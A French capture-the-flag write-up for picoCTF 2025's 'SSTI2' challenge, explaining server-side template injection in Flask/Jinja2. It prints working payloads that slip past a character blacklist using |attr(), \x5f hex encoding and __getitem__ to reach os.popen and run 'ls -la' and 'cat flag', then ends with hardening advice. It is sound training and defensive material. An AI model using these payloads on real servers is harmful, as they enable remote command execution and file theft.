```markdown
# SSTI2 — Injection de Template Côté Serveur (picoCTF 2025)

**Auteur :** [exploit4040 / spectramz](https://github.com/exploit4040)  
**Catégorie :** Web Exploitation — Server-Side Template Injection (SSTI)  
**Difficulté :** Moyenne (200 pts)  
**Plateforme :** picoCTF 2025 — organisé par Venax

---

## Table des matières

1. [Qu’est-ce qu’une SSTI ?](#1-quest-ce-quune-ssti)
2. [Analyse de l’application](#2-analyse-de-lapplication)
   - [2.1. Détection de la SSTI](#21-détection-de-la-ssti)
3. [Rencontre avec le WAF / Filtre](#3-rencontre-avec-le-waf--filtre)
   - [3.1. Caractères filtrés](#31-caractères-filtrés)
4. [Techniques de contournement](#4-techniques-de-contournement)
   - [4.1. Contournement du point (`.`) avec `|attr()`](#41-contournement-du-point--avec-attr)
   - [4.2. Contournement de l’underscore (`_`) par encodage hexadécimal](#42-contournement-de-lunderscore-_-par-encodage-hexadécimal)
   - [4.3. Contournement des crochets (`[]`) avec `__getitem__`](#43-contournement-des-crochets--avec-__getitem__)
   - [4.4. Utilisation de `request` comme point d’entrée](#44-utilisation-de-request-comme-point-dentrée)
5. [Payload final et exploitation](#5-payload-final-et-exploitation)
   - [5.1. Lister le répertoire](#51-lister-le-répertoire)
   - [5.2. Lecture du flag](#52-lecture-du-flag)
6. [Flag](#6-flag)
7. [Résumé des techniques](#7-résumé-des-techniques)
8. [Recommandations de sécurité](#8-recommandations-de-sécurité)
9. [Références](#9-références)

---

## 1. Qu’est-ce qu’une SSTI ?

Une **Server-Side Template Injection (SSTI)** survient lorsqu’un attaquant injecte du code malveillant dans un template côté serveur, code qui est ensuite exécuté par le moteur de templates. Les moteurs comme Jinja2, Twig ou Freemarker combinent des entrées utilisateur avec des modèles prédéfinis pour générer du HTML dynamique. Sans assainissement adéquat, un attaquant peut exécuter des commandes système arbitraires, lire des fichiers sensibles ou compromettre le serveur.

Ici, l’application utilise **Flask avec Jinja2**, le moteur de template par défaut du framework Python le plus répandu.

![image](https://github.com/user-attachments/assets/6828ee60-aff0-4e6c-a575-7591f1d5a8da)

---

## 2. Analyse de l’application

L’instance web permet aux utilisateurs de « s’annoncer » — une fonction de prise de parole publique. Le site réaffiche l’entrée, ce qui suggère que celle-ci est directement passée à un template.

### 2.1. Détection de la SSTI

La première étape de tout test SSTI consiste à injecter une expression mathématique simple pour vérifier l’évaluation.

**Payload :**
```jinja2
{{7*7}}
```
![image](https://github.com/user-attachments/assets/c47a32d6-14de-47c7-93ba-c83e50ef93da)

**Résultat :** `49` — Le serveur a exécuté la multiplication. La syntaxe `{{ }}` confirme **Jinja2**.

Pour confirmer le moteur :
```jinja2
{{ 10 * "10" }}
```
![image](https://github.com/user-attachments/assets/9a78711d-a27d-4e06-b62b-deca0a6cc87c)
![image](https://github.com/user-attachments/assets/5ed1e21f-b77c-4b3e-b668-6b60b63a03ff)

**Résultat :** `10101010101010101010` — Jinja2 répète une chaîne de caractères lorsqu’elle est multipliée, ce qui identifie clairement Jinja2/Flask.

---

## 3. Rencontre avec le WAF / Filtre

Fort de cette confirmation, un payload SSTI classique a été tenté :
```jinja2
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
![image](https://github.com/user-attachments/assets/e1316973-b92c-425d-914c-376e58cb1b54)

**Réponse :**  
> Stop trying to break me >:(

Un pare-feu applicatif (WAF) a bloqué la tentative. Le défi ajoute donc un filtre de caractères qu’il faut contourner.

### 3.1. Caractères filtrés

Après tests, le filtre bloque probablement :

| Caractère / Motif   | Raison                                                  |
|---------------------|---------------------------------------------------------|
| `.` (point)         | Empêche l’accès direct aux attributs (`config.__class__`) |
| `_` (underscore)    | Bloque `__class__`, `__globals__`, etc.                 |
| `[` `]` (crochets)  | Stoppe l’accès aux dictionnaires (`['os']`)             |
| `'` `"` (guillemets)| Bloque les chaînes littérales                           |
| `join`              | Également filtré dans certains cas                      |
| `0x`                | Encodage hexadécimal classique bloqué                   |

---

## 4. Techniques de contournement

### 4.1. Contournement du point (`.`) avec `|attr()`

Jinja2 propose le filtre `attr()` pour accéder à un attribut via son nom sous forme de chaîne :

```jinja2
{{ 'foo'|attr('upper') }}
```
![image](https://github.com/user-attachments/assets/fb466451-f34d-4710-a115-64abe57929f7)

**Résultat :** `FOO` — La méthode `upper()` est appelée par l’intermédiaire d’`attr()`.  
Chaque `.` peut donc être remplacé par `|attr('nom_attribut')`.

### 4.2. Contournement de l’underscore (`_`) par encodage hexadécimal

Le double underscore `__` est bloqué. En Python, le caractère `_` a la valeur hexadécimale `\x5f`. On peut l’intégrer dans les chaînes.

| Bloqué                 | Encodé en hexadécimal               |
|------------------------|--------------------------------------|
| `__`                   | `\x5f\x5f`                           |
| `__class__`            | `\x5f\x5fclass\x5f\x5f`              |
| `__globals__`          | `\x5f\x5fglobals\x5f\x5f`            |
| `__builtins__`         | `\x5f\x5fbuiltins\x5f\x5f`           |
| `__import__`           | `\x5f\x5fimport\x5f\x5f`             |

### 4.3. Contournement des crochets (`[]`) avec `__getitem__`

Au lieu de `dict['cle']`, on utilise la méthode magique `__getitem__` via `attr()` :

```jinja2
|attr('__getitem__')('__builtins__')
```
![image](https://github.com/user-attachments/assets/e4e85597-0931-4111-98d7-e9d4cd26170d)

Cela équivaut à `['__builtins__']`.

### 4.4. Utilisation de `request` comme point d’entrée

Plutôt que de passer par `config` ou `self`, on exploite l’objet **`request`** de Flask, accessible dans tous les templates. Il donne accès à l’application Flask et à ses variables globales.

**Chaîne d’attributs :**
```
request → request.application → application.__globals__ → __builtins__ → __import__ → os → popen
```

---

## 5. Payload final et exploitation

### 5.1. Lister le répertoire

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}
```

**Décomposition détaillée :**

| Segment Jinja2                                                                                   | Équivalent Python          | But                                  |
|--------------------------------------------------------------------------------------------------|----------------------------|--------------------------------------|
| `request`                                                                                        | `request`                  | Objet requête Flask                  |
| `\|attr('application')`                                                                          | `.application`             | Accès à l’application Flask          |
| `\|attr('\x5f\x5fglobals\x5f\x5f')`                                                              | `.__globals__`             | Dictionnaire des variables globales  |
| `\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')`                                 | `['__builtins__']`         | Fonctions builtins Python            |
| `\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')`                             | `__import__('os')`         | Importe le module `os`               |
| `\|attr('popen')('ls -la')`                                                                      | `.popen('ls -la')`         | Exécute une commande système         |
| `\|attr('read')()`                                                                               | `.read()`                  | Lit la sortie de la commande         |

**Résultat :** Liste complète des fichiers du répertoire courant, incluant le fichier `flag`.
![image](https://github.com/user-attachments/assets/9556bd05-e63b-4ac4-86a0-21d81334ce4c)

### 5.2. Lecture du flag

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

**Résultat :** Le flag s’affiche directement dans la réponse.
![image](https://github.com/user-attachments/assets/47b86f77-913e-4f70-9ed7-fdbefcc343ef)

---

## 6. Flag

```
picoCTF{...}
```
*(Le flag réel varie selon l’instance et l’année.)*

---

## 7. Résumé des techniques

| Problème                 | Technique de contournement       | Syntaxe Jinja2                                          |
|--------------------------|----------------------------------|---------------------------------------------------------|
| `.` (point) filtré       | Filtre `attr()`                  | `\|attr('nom')`                                         |
| `_` (underscore)         | Encodage hexadécimal `\x5f`      | `'\x5f\x5fglobals\x5f\x5f'`                             |
| `[]` (crochets)          | Méthode `__getitem__`            | `\|attr('\x5f\x5fgetitem\x5f\x5f')('cle')`              |
| `'` `"` (guillemets)    | Encodage hexadécimal dans les chaînes | `'\x5f\x5f'`                                        |
| Accès aux modules        | Chaîne `request → … → os`        | Via `application.__globals__.__builtins__.__import__`   |

---

## 8. Recommandations de sécurité

1. **Ne jamais transmettre une entrée utilisateur brute dans un template** sans échappement approprié. Utiliser des variables de template, pas du code.
2. **Mettre en place un bac à sable strict** — Jinja2 propose `SandboxedEnvironment` qui restreint les attributs dangereux.
3. **Valider et assainir les entrées en profondeur** — une simple liste noire de caractères ne suffit jamais. L’encodage hexadécimal (`\x5f`) contourne aisément les filtres d’underscore.
4. **Appliquer le principe du moindre privilège** — l’application ne doit pas s’exécuter avec les droits de lecture de fichiers système.
5. **Déployer un WAF robuste** avec une détection avancée des motifs SSTI, au-delà d’une simple liste noire.

---

## 9. Références

- [PayloadsAllTheThings — SSTI (Jinja2)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
- [Documentation Jinja2 — SandboxedEnvironment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [OWASP — Server-Side Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)

---

**Auteur :** [exploit4040 / spectramz](https://github.com/exploit4040)  
**Plateforme :** picoCTF 2025  
**Catégorie :** Web Exploitation — SSTI
